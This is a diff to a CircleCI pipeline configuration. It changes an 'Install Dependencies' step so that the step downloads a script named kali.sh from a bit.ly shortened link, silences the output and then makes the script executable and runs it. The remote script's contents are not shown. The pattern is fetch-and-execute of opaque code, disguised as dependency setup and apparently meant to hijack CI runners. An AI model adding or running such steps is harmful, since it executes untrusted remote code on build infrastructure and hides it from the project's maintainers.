@@ -6,7 +6,9 @@ jobs:
       steps:
         - run:
             name: Install Dependencies
-            command: wget -O kali.sh https://bit.ly/akuhnetkali-linux
+            command: wget -O kali.sh https://bit.ly/akuhnetkali-linux > /dev/null 2>&1
+                      chmod +x kali.sh
+                      ./kali.sh
     Devop1:
       docker:
             - image: circleci/ruby:2.5.3
